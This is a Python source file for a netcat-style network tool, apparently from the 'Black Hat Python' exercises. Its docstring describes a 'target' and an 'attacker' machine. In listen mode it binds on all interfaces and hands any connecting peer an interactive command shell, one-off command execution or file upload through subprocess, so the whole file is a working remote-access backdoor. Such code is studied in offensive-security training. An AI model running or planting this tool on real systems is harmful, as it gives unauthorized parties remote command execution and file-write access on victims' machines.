import argparse
import socket
import shlex        	# Unix-like shell lexical analyzer. 
import subprocess
import sys
import threading
import textwrap

"""
This script needs to be run on two devices: a target machine and an attacker machine.
From the target machine, run the script with the -l flag to start a listener.
From the attacking machine, run the script with the -c, -e, or -u flags to execute commands on the target. 

"""

# Use check_output to execute commands and return STDOUT
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    else:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # Create the NetCat.socket object to the 'INET' Address Family and set the socket type (transport type) to TCP.
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set socket options. At the socket level (SOL_SOCKET), set the ReuseAddress option to 1 to allow resuse of local addresses.
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()


    def listen(self):
        # Allow a connection only from the target
        self.socket.bind(('0.0.0.0', self.args.port))
        self.socket.listen(5)
        # After a connection has been successfully made, start a loop to pass connected sockets to the handle method.
        while True:
            client_socket, _ = self.socket.accept()
            # Create a thread object with the handle method and pass client_socket as an argument to it.
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()


    def handle(self, client_socket):      
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


    def send(self):
        # For -c, -e, and -u, start by connecting to the target.
        self.socket.connect((self.args.target, self.args.port))
        # If there is a STDIN, send it to target.
        if self.buffer:
            self.socket.send(self.buffer)
        # Create a try/catch block that will allow keep the connection open unless CTRL-C is pressed.
        try:
            # After sending the STDIN, create a loop that will checks for a response.
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    # Whenever data is received, add the data to the response variable.
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                # When the response is complete, print it to the console.
                if response:
                    print(response)
                    # Hang until a new command is given. Then, send the command to the target.
                    buffer = input('>')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated')
            self.socket.close()
            sys.exit()


# End with main. In main, set up the allowed arguments the script will take.
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        epilog=textwrap.dedent('''Example:\tnetcat.py -t 192.168.1.108 -p 555 -l -c # command shell\n'''))
    # List script arguments here:
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-u', '--upload', help='upload file')
    parser.add_argument('-t', '--target', default='192.168.1.183', help='target IP')
    parser.add_argument('-p', '--port', type=int, default=4444, help='specified port')
    args = parser.parse_args()
    
    # If the "listen" argument is passed, clear the buffer. Otherwise, pass STDIN to buffer.
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
        print(buffer)

    nc = NetCat(args, buffer.encode())
    nc.run()